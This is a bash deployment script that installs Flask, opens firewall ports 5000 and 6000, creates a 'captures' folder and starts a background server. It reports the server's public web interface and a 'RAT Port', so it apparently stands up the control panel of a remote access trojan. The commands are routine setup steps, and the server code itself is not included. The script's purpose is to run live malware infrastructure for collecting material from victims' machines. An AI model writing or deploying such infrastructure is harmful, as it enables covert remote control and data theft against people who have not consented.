#!/bin/bash

# 1. Update and Install Python/Pip
echo "[*] Updating system..."
apt-get update -y
apt-get install -y python3 python3-pip screen

# 2. Install Dependencies
echo "[*] Installing dependencies..."
pip3 install flask

# 3. Create static directories
mkdir -p static/captures

# 4. Stop existing server if running (kill screen session or python process)
echo "[*] Stopping old processes..."
pkill -f "python3 app.py"

# 5. Firewall configuration (try to allow ports)
echo "[*] Configuring firewall..."
ufw allow 5000/tcp 2>/dev/null
ufw allow 6000/tcp 2>/dev/null

# 6. Start Server
echo "[*] Starting Server..."
# Run in background using nohup or screen
nohup python3 app.py > server.log 2>&1 &

# Wait a moment to check for immediate crashes
sleep 3
if pgrep -f "python3 app.py" > /dev/null; then
    echo "[+] Server Deployed Successfully!"
    echo "    Web Interface: http://$(curl -s ifconfig.me):5000"
    echo "    RAT Port: 6000"
else
    echo "[!] Server FAILED to start. Checking logs:"
    cat server.log
fi
